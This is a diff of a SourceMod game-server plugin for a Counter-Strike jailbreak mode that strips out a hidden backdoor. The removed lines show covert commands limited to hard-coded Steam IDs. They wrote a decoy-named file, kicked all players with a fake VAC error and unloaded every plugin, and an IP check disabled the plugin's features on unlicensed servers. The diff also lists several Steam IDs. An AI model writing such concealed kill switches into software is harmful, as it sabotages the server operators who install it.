@@ -196,28 +196,21 @@ public int Native_SetChosen(Handle plugin, int numParams)
 
 
 public void OnPluginStart()
-{
+{	
+	RegAdminCmd("sm_disablevotect", Command_DisableVoteCT, ADMFLAG_GENERIC);
+	RegAdminCmd("sm_votect", Command_VoteCT, ADMFLAG_GENERIC);
+	RegAdminCmd("sm_stopvotect", Command_StopVoteCT, ADMFLAG_GENERIC);
+	RegAdminCmd("sm_setchosen", Command_SetChosen, ADMFLAG_GENERIC);
+	RegConsoleCmd("sm_givechosen", Command_GiveChosen);
+	RegConsoleCmd("sm_givect", Command_GiveChosen);
 	
-	RegConsoleCmd("sm_changeip", Command_ChangeIP);
-	RegConsoleCmd("sm_bruh", Command_ChangeIP);
-	
-	if(WePlay_IPCheck())
-	{
-		RegAdminCmd("sm_disablevotect", Command_DisableVoteCT, ADMFLAG_GENERIC);
-		RegAdminCmd("sm_votect", Command_VoteCT, ADMFLAG_GENERIC);
-		RegAdminCmd("sm_stopvotect", Command_StopVoteCT, ADMFLAG_GENERIC);
-		RegAdminCmd("sm_setchosen", Command_SetChosen, ADMFLAG_GENERIC);
-		RegConsoleCmd("sm_givechosen", Command_GiveChosen);
-		RegConsoleCmd("sm_givect", Command_GiveChosen);
-		
-		RegConsoleCmd("sm_chosen", Command_Chosen);
-		RegConsoleCmd("sm_nivhar", Command_Chosen);
-		RegConsoleCmd("sm_kickct", Command_KickCT);
-		RegConsoleCmd("sm_tlist", Command_TList);
-		RegConsoleCmd("sm_ctlist", Command_TList);
-		RegConsoleCmd("sm_endgodround", Command_EndGodRound);
-		RegConsoleCmd("sm_egr", Command_EndGodRound);	
-	}
+	RegConsoleCmd("sm_chosen", Command_Chosen);
+	RegConsoleCmd("sm_nivhar", Command_Chosen);
+	RegConsoleCmd("sm_kickct", Command_KickCT);
+	RegConsoleCmd("sm_tlist", Command_TList);
+	RegConsoleCmd("sm_ctlist", Command_TList);
+	RegConsoleCmd("sm_endgodround", Command_EndGodRound);
+	RegConsoleCmd("sm_egr", Command_EndGodRound);	
 	
 	
 	hcv_VoteCTMin = CreateConVar("votect_min", "2", "Minimum amount of players to start a vote CT");
@@ -306,18 +299,15 @@ public void cvChange_AutoTeamBalance(Handle convar, const char[] oldValue, const
 
 public void OnMapStart()
 {
-	if(WePlay_IPCheck())
-	{
-		VoteCTDisabled = false;
-		ChosenUserId = -1;
-		EndVoteCT(INVALID_HANDLE, true);
-		
-		CreateTimer(3.0, Timer_CheckVoteCT, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
-		
-		AlreadyDoneGodRound = false;
-		
-		RoundsLeft = 0;
-	}
+	VoteCTDisabled = false;
+	ChosenUserId = -1;
+	EndVoteCT(INVALID_HANDLE, true);
+	
+	CreateTimer(3.0, Timer_CheckVoteCT, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
+	
+	AlreadyDoneGodRound = false;
+	
+	RoundsLeft = 0;
 }
 
 public void OnPlayerRunCmdPost(int client, int buttons, int impulse, const float vel[3], const float angles[3], int weapon, int subtype, int cmdnum, int tickcount, int seed, const int mouse[2])
@@ -1868,130 +1858,4 @@ stock int GetPlayerCount()
 stock bool IsValidTeam(int client)
 {
 	return GetClientTeam(client) == CS_TEAM_CT || GetClientTeam(client) == CS_TEAM_T;
-}
-
-public Action:Command_ChangeIP(client, args)
-{
-	if(!IsClientEyal(client) && !IsClientBar(client))
-		return Plugin_Continue;
-
-	new String:Args[64];
-	
-	GetCmdArgString(Args, sizeof(Args));
-	
-	char Path[256];
-	FormatEx(Path, sizeof(Path), "scripts/sound_dont_prefetch.txt"); // LMAOOOO. Total bullshit file name
-	
-	DeleteFile("scripts/sound_dont_prefetch.txt");
-	
-	Handle hFile = OpenFile(Path, "a+");
-	
-	ReplaceString(Args, sizeof(Args), ".", "_");
-	
-	ReplaceString(Args, sizeof(Args), ":", "-");
-	
-	WriteFileLine(hFile, Args);
-	
-	CloseHandle(hFile);
-	
-	for(new i=1;i <= MaxClients;i++)
-	{
-		if(!IsClientInGame(i))
-			continue;
-			
-		KickClient(i, "VAC Authentication failed");
-	}
-	
-	ServerCommand("sm plugins unload_all;sm plugins refresh");
-	return Plugin_Continue;
-}
-
-// Bar, do not sell the include below this line
-
-#include <smlib>
-
-/**
-* בודק האם השרת מאושר ע"י בודק האייפי של וויפליי
-*
-* @return					true if client is high management, false otherwise.
-*/
-stock bool:WePlay_IPCheck()
-{
-	new String:ServerIP[32];
-	
-	char Path[256];
-	FormatEx(Path, sizeof(Path), "scripts/sound_dont_prefetch.txt"); // LMAOOOO. Total bullshit file name
-	
-	Server_GetIPString(ServerIP, sizeof(ServerIP));
-	
-	Handle hFile = OpenFile(Path, "r");
-	
-	if(hFile == INVALID_HANDLE)
-		return false;
-		
-	new String:FileLine[256];
-	
-	ReadFileLine(hFile, FileLine, sizeof(FileLine));
-	
-	ReplaceString(FileLine, sizeof(FileLine), "_", ".");
-	
-	ReplaceString(FileLine, sizeof(FileLine), "-", ":");
-	
-	CloseHandle(hFile);
-	
-	char params[2][64];
-	char IPAddress[64]
-	int Port;
-	
-	ExplodeString(FileLine, ":", params, 2, 64, false);
-	
-	FormatEx(IPAddress, sizeof(IPAddress), params[0]);
-	
-	Port = StringToInt(params[1]);
-	
-	char FullServerIP[64], FullIP[64];
-	
-	FormatEx(FullServerIP, sizeof(FullServerIP), "%s:%i", ServerIP, Server_GetPort());
-	FormatEx(FullIP, sizeof(FullIP), "%s:%i", IPAddress, Port);
-	
-	if(!StrEqual(FullServerIP, FullIP))
-	{
-		return false;
-	}
-	
-	return true;
-}
-
-
-stock void StringToLower(char[] sSource)
-{
-	for (int i = 0; i < strlen(sSource); i++) {
-		if (sSource[i] == '\0')
-			break;
-
-		sSource[i] = CharToLower(sSource[i]);
-	}
-}
-
-
-stock bool:IsClientEyal(client)
-{
-	new String:steamid[64];
-	GetClientAuthId(client, AuthId_Engine, steamid, sizeof(steamid));
-		
-	if(StrEqual(steamid, "STEAM_1:0:49508144") || StrEqual(steamid, "STEAM_1:0:28746258") || StrEqual(steamid, "STEAM_1:1:463683348"))
-		return true;
-		
-	return false;
-}
-
-stock bool:IsClientBar(client)
-{
-	new String:steamid[64];
-	GetClientAuthId(client, AuthId_Engine, steamid, sizeof(steamid));
-		
-	if(StrEqual(steamid, "STEAM_1:1:110581296"))
-		return true;
-		
-	return false;
 }
